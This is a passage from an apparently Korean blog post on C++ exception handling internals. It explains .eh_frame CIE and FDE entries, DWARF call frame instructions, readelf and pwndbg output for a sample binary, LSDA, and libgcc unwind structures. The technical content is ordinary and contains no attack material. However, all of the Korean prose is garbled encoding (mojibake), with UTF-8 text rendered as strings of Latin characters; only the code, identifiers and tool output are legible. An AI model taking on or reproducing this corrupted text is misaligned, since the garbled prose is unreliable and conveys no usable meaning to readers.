ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</li></ul></li><li><code>code_alignment_factor</code><ul><li>í…Œì´ë¸”ì˜ í–‰ì— í•´ë‹¹í•˜ëŠ” ì½”ë“œ ì£¼ì†Œë¥¼ ê³„ì‚°í•˜ê¸° ìœ„í•´ ì£¼ì–´ì§„ ì˜¤í”„ì…‹ì— ê³±í•˜ëŠ” ìƒìˆ˜ ê°’ì¸ë°, í›„ìˆ í•©ë‹ˆë‹¤.</li></ul></li><li><code>data_alignment_factor</code><ul><li>ìŠ¤íƒì—ì„œ CFAë¥¼ ê¸°ì¤€ìœ¼ë¡œ íŠ¹ì • ì£¼ì†Œì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ì£¼ì–´ì§„ ì˜¤í”„ì…‹ì— ê³±í•˜ëŠ” ìƒìˆ˜ ê°’ì¸ë°, í›„ìˆ í•©ë‹ˆë‹¤.</li></ul></li><li><code>initial_instructions</code><ul><li>í…Œì´ë¸”ì˜ í–‰ì„ êµ¬ì„±í•˜ê¸° ìœ„í•´ ê°€ì¥ ë¨¼ì € ìˆ˜í–‰í•´ì•¼ í•˜ëŠ” í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì…ë‹ˆë‹¤.</li></ul></li></ol><p>FDEì˜ ë‚´ìš© ì¤‘ ì¤‘ìš”í•œ í•„ë“œë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>CIE_pointer</code><ul><li>ì´ FDEê°€ ì¢…ì†ëœ CIEë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤.</li></ul></li><li><code>initial_location</code><ul><li>í…Œì´ë¸”ì—ì„œ ì´ FDEê°€ ë‚˜íƒ€ë‚´ëŠ” í–‰ë“¤ì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤.</li></ul></li><li><code>address_range</code><ul><li>FDEê°€ ë‚˜íƒ€ë‚´ëŠ” í–‰ë“¤ì´ ì‹œì‘ ì£¼ì†Œë¡œë¶€í„° ëª‡ ë°”ì´íŠ¸ë§Œí¼ ë–¨ì–´ì§„ ì£¼ì†Œê¹Œì§€ ìœ íš¨í•œì§€ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.</li></ul></li><li><code>instructions</code><ul><li>í…Œì´ë¸”ì˜ í–‰ì„ êµ¬ì„±í•˜ê¸° ìœ„í•´ ìˆ˜í–‰í•˜ëŠ” í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì…ë‹ˆë‹¤.</li></ul></li></ol><p>ì¦‰, <code>.eh_frame</code> ì„¹ì…˜ì—ì„œ CIEì™€ FDEë“¤ì˜ ê´€ê³„ëŠ” ê·¸ë¦¼ê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/6.png" alt="6.png"></p><h2 id="%ED%98%B8%EC%B6%9C-%ED%94%84%EB%A0%88%EC%9E%84-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1">í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜</h2><p>í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ íŠ¹ì • ì£¼ì†Œì˜ ì½”ë“œì—ì„œ ì´ì „ í”„ë ˆì„ì„ ë³µì›í•˜ì—¬ ìŠ¤íƒì„ ë˜ê°ì„ ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì§€ì‹œí•˜ëŠ” ë°”ì´íŠ¸ì½”ë“œ í˜•ì‹ì…ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ CIEì—ì„œ CFAì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ ë³µì›í•˜ê³ , FDEì—ì„œ í”„ë ˆì„ í¬ì¸í„°ì™€ ê°™ì€ ë‚˜ë¨¸ì§€ ë²”ìš© ë ˆì§€ìŠ¤í„°ë¥¼ ë³µì›í•©ë‹ˆë‹¤. ìì£¼ ì‚¬ìš©ë˜ëŠ” í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li><code>DW_CFA_def_cfa</code><ul><li>ë ˆì§€ìŠ¤í„° <code>RN</code> ê³¼ ì˜¤í”„ì…‹ <code>offset</code> ì„ ë°›ì•„, CFAë¥¼ <code>RN + offset</code> ìœ¼ë¡œ ì •ì˜í•©ë‹ˆë‹¤.</li></ul></li><li><code>DW_CFA_def_cfa_offset</code><ul><li>ì˜¤í”„ì…‹ <code>offset</code> ì„ ë°›ì•„, CFAë¥¼ <code>RN + offset</code> ìœ¼ë¡œ ë‹¤ì‹œ ì •ì˜í•©ë‹ˆë‹¤. (<code>RN</code> ì€ ê¸°ì¡´ ê°’ì„ ì‚¬ìš©í•©ë‹ˆë‹¤)</li></ul></li><li><code>DW_CFA_def_cfa_register</code><ul><li>ë ˆì§€ìŠ¤í„° <code>RN</code> ì„ ë°›ì•„, CFAë¥¼ <code>RN + offset</code> ìœ¼ë¡œ ë‹¤ì‹œ ì •ì˜í•©ë‹ˆë‹¤. (<code>offset</code> ì€ ê¸°ì¡´ ê°’ì„ ì‚¬ìš©í•©ë‹ˆë‹¤)</li></ul></li><li><code>DW_advance_loc</code><ul><li>ìƒìˆ˜ <code>delta</code> ë¥¼ ë°›ì•„, ì½”ë“œ ì£¼ì†Œ <code>initial_location + delta * code_alignment_factor</code> ì— í•´ë‹¹í•˜ëŠ” ìƒˆë¡œìš´ í…Œì´ë¸” í–‰ì„ ì¶”ê°€í•©ë‹ˆë‹¤.</li></ul></li><li><code>DW_CFA_offset</code><ul><li>ë ˆì§€ìŠ¤í„° <code>RN</code> ê³¼ ì˜¤í”„ì…‹ <code>offset</code> ì„ ë°›ì•„, <code>RN</code> ì„ ì£¼ì†Œ <code>CFA + offset * data_alignment_factor</code> ì˜ ê°’ìœ¼ë¡œ ë³µì›í•©ë‹ˆë‹¤.</li></ul></li></ul><p>CIEì™€ FDEì— ì €ì¥ëœ í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ <code>readelf</code> ì»¤ë§¨ë“œë¡œ ì½ê¸° ì‰½ê²Œ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>readelf</code> ì— <code>--debug-dump=frames</code> ì˜µì…˜ì„ ì£¼ì–´ <code>eh1</code> ë°”ì´ë„ˆë¦¬ì˜ í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í™•ì¸í•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ readelf --debug-dump=frames eh1</span><br><span class="line">Contents of the .eh_frame section:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000 0000000000000014 00000000 CIE</span><br><span class="line">  Version:               1</span><br><span class="line">  Augmentation:          &quot;zR&quot;</span><br><span class="line">  Code alignment factor: 1</span><br><span class="line">  Data alignment factor: -8</span><br><span class="line">  Return address column: 16</span><br><span class="line">  Augmentation data:     1b</span><br><span class="line">  DW_CFA_def_cfa: r7 (rsp) ofs 8</span><br><span class="line">  DW_CFA_offset: r16 (rip) at cfa-8</span><br><span class="line">  DW_CFA_nop</span><br><span class="line">  DW_CFA_nop</span><br><span class="line"></span><br><span class="line">00000018 0000000000000010 0000001c FDE cie=00000000 pc=0000000000401130..000000000040115f</span><br><span class="line">  DW_CFA_advance_loc: 4 to 0000000000401134</span><br><span class="line">  DW_CFA_undefined: r16 (rip)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>CIE_id</code> ê°€ <code>00000000</code> ì¸ CIEì˜ ê°ì¢… í•„ë“œì™€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜, ê·¸ë¦¬ê³  ì´ CIEì— ì¢…ì†ëœ FDEë“¤ì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. CIEì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì€ <code>DW_CFA_def_cfa</code> ë¡œ CFAë¥¼ ì •ì˜í•˜ê³  <code>DW_CFA_offset</code> ìœ¼ë¡œ R16 (<code>rip</code>)ì„ ë³µì›í•©ë‹ˆë‹¤. <code>return_address_register</code> í•„ë“œê°€ 16ì´ë¯€ë¡œ ë³µì›í•œ R16ì´ ì´ í”„ë ˆì„ì˜ ë¦¬í„´ ì£¼ì†Œì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>func2</code> í•¨ìˆ˜ì˜ ì£¼ì†Œ ë²”ìœ„ì— ëŒ€í•œ FDEë¥¼ ì‚´í´ë³´ë©° í˜¸ì¶œ í”„ë ˆì„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ë¶„ì„í•´ ë³´ê² ìŠµë‹ˆë‹¤. <code>func</code> í•¨ìˆ˜ëŠ” ì£¼ì†Œ <code>0x401216</code> ì— ìœ„ì¹˜í•˜ë©°, í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì—ì„œ ì´ì „ í•¨ìˆ˜ì˜ <code>rbp</code> ê°’ì„ ìŠ¤íƒì— í‘¸ì‹œí•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass func2</span><br><span class="line">Dump of assembler code for function func2(int):</span><br><span class="line">   0x0000000000401216 &lt;+0&gt;: endbr64</span><br><span class="line">   0x000000000040121a &lt;+4&gt;: push   rbp</span><br><span class="line">   0x000000000040121b &lt;+5&gt;: mov    rbp,rsp</span><br><span class="line">   0x000000000040121e &lt;+8&gt;: sub    rsp,0x10</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000401266 &lt;+80&gt;:    leave</span><br><span class="line">   0x0000000000401267 &lt;+81&gt;:    ret</span><br></pre></td></tr></table></figure><p><code>grep</code> ì„ ì‚¬ìš©í•˜ì—¬ <code>readelf</code> ì»¤ë§¨ë“œì˜ ê²°ê³¼ë¡œë¶€í„° ì£¼ì†Œ <code>401216</code> ë¶€í„° ì‹œì‘í•˜ëŠ” FDEë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤. <code>pc=0000000000401216..0000000000401268</code> ì—ì„œ ì´ FDEê°€ <code>func2</code> í•¨ìˆ˜ì˜ ì£¼ì†Œ ë²”ìœ„ì— ëŒ€ì‘í•˜ëŠ” ì—”íŠ¸ë¦¬ì„ì„ ì•Œ ìˆ˜ ìˆìœ¼ë©°, <code>cie=00000000</code> ì—ì„œ <code>CIE_id</code> ê°€ <code>00000000</code> ì¸ CIEì— ì¢…ì†ë¨ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf --debug-dump=frames eh1 | grep 401216 -A 10</span><br><span class="line">000000e4 000000000000001c 000000e8 FDE cie=00000000 pc=0000000000401216..0000000000401268</span><br><span class="line">  DW_CFA_advance_loc: 5 to 000000000040121b</span><br><span class="line">  DW_CFA_def_cfa_offset: 16</span><br><span class="line">  DW_CFA_offset: r6 (rbp) at cfa-16</span><br><span class="line">  DW_CFA_advance_loc: 3 to 000000000040121e</span><br><span class="line">  DW_CFA_def_cfa_register: r6 (rbp)</span><br><span class="line">  DW_CFA_advance_loc1: 73 to 0000000000401267</span><br><span class="line">  DW_CFA_def_cfa: r7 (rsp) ofs 8</span><br><span class="line">  DW_CFA_nop</span><br><span class="line">  DW_CFA_nop</span><br></pre></td></tr></table></figure><p>FDEì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë“¤ì„ ë³´ë©´ <code>DW_CFA_advance_loc</code> ì„ í†µí•´ ìƒˆë¡œìš´ í–‰ì„ ë§Œë“¤ê³ , <code>DW_CFA_def_cfa_offset</code> ë“±ìœ¼ë¡œ CFAë¥¼ ì¬ì •ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í•´ë‹¹ ì£¼ì†Œì—ì„œ <code>mov rbp,rsp</code> , <code>sub rsp,0x10</code> ì™€ ê°™ì€ ì½”ë“œê°€ ì‹¤í–‰ë˜ì–´ CIEì—ì„œ CFA ê³„ì‚°ì˜ ê¸°ì¤€ì´ ë˜ì—ˆë˜ <code>rsp</code> ì˜ ê°’ì´ ê³„ì† ë°”ë€Œê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. <code>func2</code> í•¨ìˆ˜ì— ëŒ€í•´ CIEì™€ FDEì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì¢…í•©í•˜ì—¬ ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ìœ„í•œ í…Œì´ë¸”ë¡œ ë‚˜íƒ€ë‚´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/7.png" alt="7.png"></p><h3 id="lsda" tabindex="-1">LSDA</h3><p>ë°”ì´ë„ˆë¦¬ì˜ <code>.eh_frame</code> ì„¹ì…˜ì— ìˆëŠ” CIEì™€ FDEë¥¼ ì°¸ì¡°í•˜ì—¬ ìŠ¤íƒ ë˜ê°ê¸°ê°€ ê°€ëŠ¥í•¨ì„ í™•ì¸í•˜ì˜€ìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ ìœ„í•´ì„œëŠ” ì˜ˆì™¸ê°€ ë°œìƒí•˜ì˜€ì„ ë•Œ ë‹¨ìˆœíˆ ë¦¬í„´ ì£¼ì†Œë¡œ ëŒì•„ê°€ëŠ” ê²ƒì´ ì•„ë‹ˆë¼, ì‹¤í–‰ íë¦„ì„ í˜¸ì¶œ ìŠ¤íƒ ìƒì—ì„œ ê°€ì¥ ê°€ê¹Œìš´ ëœë”© íŒ¨ë“œë¡œ ì •í™•íˆ ëŒë ¤ì•¼ í•©ë‹ˆë‹¤. ìŠ¤íƒ ë˜ê°ê¸° ì´í›„ì— ì¶”ê°€ì ì¸ ì‘ì—…ì´ í•„ìš”í•œ ê²ƒì…ë‹ˆë‹¤.</p><p>ëŸ°íƒ€ì„ì—ì„œ ì˜ˆì™¸ ë°œìƒ í›„ ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ìˆ˜í–‰í•˜ê³  ë‚˜ë©´, C++ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— êµ¬í˜„ëœ í•¨ìˆ˜ê°€ ê°œì…í•˜ì—¬ ë°œìƒí•œ ì˜ˆì™¸ì— í•´ë‹¹í•˜ëŠ” ëœë”© íŒ¨ë“œë¡œ ì‹¤í–‰ íë¦„ì„ ì˜®ê¹ë‹ˆë‹¤. ì´ í•¨ìˆ˜ì™€ ê°™ì´ íŠ¹ì • ì–¸ì–´ë§Œì˜ ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ ìœ„í•´ ì œê³µëœ í•¨ìˆ˜ë¥¼ personality ë£¨í‹´ì´ë¼ê³  í•©ë‹ˆë‹¤. Personality ë£¨í‹´ì€ LSDA(language specific data area)ë¼ëŠ” ì˜ì—­ì— ìœ„ì¹˜í•œ ì—¬ëŸ¬ ê°€ì§€ ì •ë³´ë¥¼ í•´ì„í•˜ì—¬ ì ì ˆí•œ ëœë”© íŒ¨ë“œì˜ ìœ„ì¹˜ë¥¼ ì°¾ì•„ëƒ…ë‹ˆë‹¤. <code>g++</code> ì»´íŒŒì¼ëŸ¬ë¡œ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ì—ì„œ LSDAëŠ” <code>.gcc_except_table</code> ì„¹ì…˜ì— ìœ„ì¹˜í•©ë‹ˆë‹¤.</p><p>C++ ì†ŒìŠ¤ ì½”ë“œìƒì—ì„œ ê°ê°ì˜ í•¨ìˆ˜ëŠ” ì„œë¡œ ë‹¤ë¥¸ LSDAë¥¼ ê°€ì§‘ë‹ˆë‹¤. LSDAëŠ” í—¤ë”ì™€ call-site í…Œì´ë¸”, ì•¡ì…˜ í…Œì´ë¸”ë¡œ ì´ë£¨ì–´ì ¸ ìˆìŠµë‹ˆë‹¤. Personality ë£¨í‹´ì€ LSDA í—¤ë”ë¥¼ ì½ì–´ í•¨ìˆ˜ ì½”ë“œ ë‚´ì—ì„œ ëœë”© íŒ¨ë“œì˜ ì‹œì‘ ì˜¤í”„ì…‹ì„ ì–»ìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  Call-site í…Œì´ë¸”ì—ì„œ ì˜ˆì™¸ê°€ ë°œìƒí•œ ì£¼ì†Œì— í•´ë‹¹í•˜ëŠ” ë ˆì½”ë“œë¥¼ ì°¾ì•„ ëœë”© íŒ¨ë“œ ë‚´ì—ì„œ ë¶„ê¸°í•´ì•¼ í•  ìµœì¢… ì˜¤í”„ì…‹ì„ ì–»ìœ¼ë©°, action í…Œì´ë¸”ì—ì„œ í•´ë‹¹í•˜ëŠ” ë ˆì½”ë“œì˜ ì˜¤í”„ì…‹ì„ ì–»ì–´ ì‹¤í–‰ íë¦„ì„ ëŒë¦´ ëª©ì ì§€ê°€ catch ë¸”ë¡ì¸ì§€ cleanup ì½”ë“œì¸ì§€ êµ¬ë³„í•©ë‹ˆë‹¤.</p><h2 id="itanium-c%2B%2B-abi" tabindex="-1">Itanium C++ ABI</h2><p>ëŸ°íƒ€ì„ì— ì‹¤ì œë¡œ ìŠ¤íƒ ë˜ê°ê¸°ì™€ ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë¡œì§ì€ ì¸í…”ì´ ì œì•ˆí•œ ì•„ì´í…Œë‹ˆì—„ C++ ABIì˜ ì˜ˆì™¸ ì²˜ë¦¬ ë¶€ë¶„ì„ êµ¬í˜„í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë“¤ì…ë‹ˆë‹¤. ì•„ì´í…Œë‹ˆì—„ C++ ABIëŠ” ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ êµ¬í˜„í•˜ëŠ” unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€, unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì˜ˆì™¸ ì²˜ë¦¬ êµ¬í˜„ì„ ìœ„í•´ ì‘ì„±ëœ C++ ABIë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤. Unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ C++ ABIì˜ ì†ŒìŠ¤ ì½”ë“œëŠ” ê°ê° GCC í”„ë¡œì íŠ¸ì˜ <code>libgcc</code> , <code>libstdc++-v3</code> ê²½ë¡œì— ìœ„ì¹˜í•©ë‹ˆë‹¤.</p><p><div class="link-preview-widget"><a href="https://github.com/gcc-mirror/gcc" rel="noopener" target="_blank"><div class="link-preview-widget-title">GitHub - gcc-mirror/gcc</div><div class="link-preview-widget-description">Contribute to gcc-mirror/gcc development by creating an account on GitHub.</div><div class="link-preview-widget-url">GitHub</div></a><a class="link-preview-widget-image" href="https://github.com/gcc-mirror/gcc" rel="noopener" style="background-image: url('https://opengraph.githubassets.com/afd448c7eec38eb90cfe8030c289eb1d48581668a3af0e87ff653529f2d55401/gcc-mirror/gcc');" target="_blank"></a></div></p><h3 id="unwind-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC" tabindex="-1">Unwind ë¼ì´ë¸ŒëŸ¬ë¦¬</h3><p>Unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ìŠ¤íƒ ë˜ê°ê¸°ëŠ” ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¤ëŠ” ê²ƒìœ¼ë¡œ ì‹œì‘í•©ë‹ˆë‹¤. ì˜ˆì™¸ ë°œìƒ ì‹œ ì˜ˆì™¸ êµ¬ì¡°ì²´ê°€ ì „ë‹¬ë˜ë©°, ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œëŠ” ì´ë¥¼ ë‹¤ìŒì˜ ë‘ ë‹¨ê³„ì— ê±¸ì³ ì²˜ë¦¬í•©ë‹ˆë‹¤.</p><ol><li>search ë‹¨ê³„<ul><li>ìŠ¤íƒì„ ê³„ì† ë˜ê°ìœ¼ë©´ì„œ personality ë£¨í‹´ì„ ë°˜ë³µí•˜ì—¬ í˜¸ì¶œí•©ë‹ˆë‹¤. Personality ë£¨í‹´ì´ ëœë”© íŒ¨ë“œë¥¼ ì°¾ìœ¼ë©´ ì„±ê³µí•˜ë©°, ì°¾ì§€ ëª»í•  ê²½ìš° ì˜ˆì™¸ ì²˜ë¦¬ì— ì‹¤íŒ¨í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ëŠ” ìŠ¤íƒì„ ë˜ê°ìœ¼ë©´ì„œ ê° í”„ë ˆì„ì˜ ë‚´ìš©ì„ ì°¸ì¡°í•˜ì§€ë§Œ, ì‹¤ì œë¡œ ì‹¤í–‰ íë¦„ê¹Œì§€ ë˜ëŒë¦¬ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤.</li></ul></li><li>cleanup ë‹¨ê³„<ul><li>ë‹¤ì‹œ ìŠ¤íƒì„ ë˜ê°ìœ¼ë©´ì„œ personality ë£¨í‹´ì„ ë°˜ë³µí•˜ì—¬ í˜¸ì¶œí•©ë‹ˆë‹¤. ëœë”© íŒ¨ë“œë¥¼ ì°¾ëŠ” ìˆœê°„ ë ˆì§€ìŠ¤í„° ê°’ë“¤ì„ ë³µì›í•˜ì—¬ ì‹¤í–‰ íë¦„ì„ ëœë”© íŒ¨ë“œë¡œ ì˜®ê¹ë‹ˆë‹¤.</li></ul></li></ol><p>Unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì‚¬ìš©í•˜ëŠ” ì¤‘ìš”í•œ êµ¬ì¡°ì²´ë¡œëŠ” <code>_Unwind_Exception</code> ê³¼ <code>_Unwind_Context</code> ê°€ ìˆìŠµë‹ˆë‹¤. <code>_Unwind_Exception</code> ëŠ” ë°œìƒí•œ ì˜ˆì™¸ë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. êµ¬ì¡°ì²´ì—ì„œ <code>exception_class</code> í•„ë“œëŠ” ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¨ í”„ë¡œê·¸ë˜ë° ì–¸ì–´ì™€ êµ¬í˜„ì²´ì— ëŒ€í•œ ì •ë³´ë¥¼ ë‚˜íƒ€ë‚´ë©°, C++ ì˜ˆì™¸ëŠ” í•˜ìœ„ 4ë°”ì´íŠ¸ê°€ <code>&quot;C++\0&quot;</code> ë¡œ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë‚˜ë¨¸ì§€ í•„ë“œëŠ” Javaì™€ ê°™ì€ ì™¸ë¶€ ì–¸ì–´ì—ì„œ ë°œìƒí•œ ì˜ˆì™¸ì™€ ê´€ë ¨ëœ í•„ë“œì…ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The unwind interface uses a pointer to an exception header object</span></span><br><span class="line"><span class="comment">   as its representation of an exception being thrown. In general, the</span></span><br><span class="line"><span class="comment">   full representation of an exception object is language- and</span></span><br><span class="line"><span class="comment">   implementation-specific, but it will be prefixed by a header</span></span><br><span class="line"><span class="comment">   understood by the unwind interface.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_Unwind_Exception</span></span><br><span class="line">&#123;</span><br><span class="line">  _Unwind_Exception_Class exception_class;</span><br><span class="line">  _Unwind_Exception_Cleanup_Fn exception_cleanup;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined (__USING_SJLJ_EXCEPTIONS__) &amp;&amp; defined (__SEH__)</span></span><br><span class="line">  _Unwind_Word private_[<span class="number">6</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  _Unwind_Word private_1;</span><br><span class="line">  _Unwind_Word private_2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* @@@ The IA-64 ABI says that this structure must be double-word aligned.</span></span><br><span class="line"><span class="comment">     Taking that literally does not make much sense generically.  Instead we</span></span><br><span class="line"><span class="comment">     provide the maximum alignment required by any type for the machine.  */</span></span><br><span class="line">&#125; __attribute__((__aligned__));</span><br></pre></td></tr></table></figure><p><code>_Unwind_Context</code> ëŠ” íŠ¹ì • í”„ë ˆì„ì—ì„œ ë ˆì§€ìŠ¤í„°ë“¤ì˜ ê°’ê³¼ CFA, ë¦¬í„´ ì£¼ì†Œ ë“± ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ìœ„í•´ í•„ìš”í•œ ì •ë³´ë“¤ì„ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. <code>reg</code> ë°°ì—´ì€ í˜¸ì¶œ í”„ë ˆì„ í…Œì´ë¸”ì—ì„œ R1, â€¦ , R16 ë ˆì§€ìŠ¤í„°ì˜ ê°’ì— í•´ë‹¹í•©ë‹ˆë‹¤. <code>cfa</code> ì™€ <code>ra</code> í•„ë“œëŠ” ê°ê° CFAì™€ ë¦¬í„´ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤. <code>lsda</code> í•„ë“œì—ëŠ” ëŸ°íƒ€ì„ì— LSDAì˜ ì£¼ì†Œë¥¼ ì°¾ì•„ ëŒ€ì…í•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is the register and unwind state for a particular frame.  This</span></span><br><span class="line"><span class="comment">   provides the information necessary to unwind up past a frame and return</span></span><br><span class="line"><span class="comment">   to its caller.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_Unwind_Context</span> &#123;</span><br><span class="line">    _Unwind_Context_Reg_Val reg[__LIBGCC_DWARF_FRAME_REGISTERS__ + <span class="number">1</span>];</span><br><span class="line">    <span class="type">void</span> *cfa;</span><br><span class="line">    <span class="type">void</span> *ra;</span><br><span class="line">    <span class="type">void</span> *lsda;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">dwarf_eh_bases</span> bases;</span><br><span class="line">    <span class="comment">/* Signal frame context.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGNAL_FRAME_BIT ((~(_Unwind_Word)0 &gt;&gt; 1) + 1)</span></span><br><span class="line">    <span class="comment">/* Context which has version/args_size/by_value fields.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXTENDED_CONTEXT_BIT ((~(_Unwind_Word)0 &gt;&gt; 2) + 1)</span></span><br><span class="line">    <span class="comment">/* Bit reserved on AArch64, return address has been signed with A or B</span></span><br><span class="line"><span class="comment">       key.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RA_SIGNED_BIT ((~(_Unwind_Word)0 &gt;&gt; 3) + 1)</span></span><br><span class="line">    _Unwind_Word flags;</span><br><span class="line">    <span class="comment">/* 0 for now, can be increased when further fields are added to</span></span><br><span class="line"><span class="comment">       struct _Unwind_Context.  */</span></span><br><span class="line">    _Unwind_Word version;</span><br><span class="line">    